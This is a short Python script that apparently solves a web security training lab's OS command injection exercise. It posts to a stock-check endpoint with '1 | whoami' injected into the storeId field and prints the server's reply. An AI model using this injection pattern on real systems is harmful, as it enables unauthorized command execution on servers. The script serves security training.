import requests
import re
import urllib.parse

Host='0a0800390423d713814c43aa00ee009b.web-security-academy.net'
Path='/product/stock'

Headers={
    'Cookie': 'session=R8cLqWFrcqdbFTsX7dzhT1qgyM0RhWLX',
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://0aed00ff0464304d823142a40091005b.web-security-academy.net",
    "Referer": "https://0aed00ff0464304d823142a40091005b.web-security-academy.net/product?productId=2"
}

data={
    "productId": "2",
    "storeId": "1"+" | whoami"
}

res=requests.post(url="https://"+Host+Path,headers=Headers,data=data)

print(res.status_code)
print(res.text)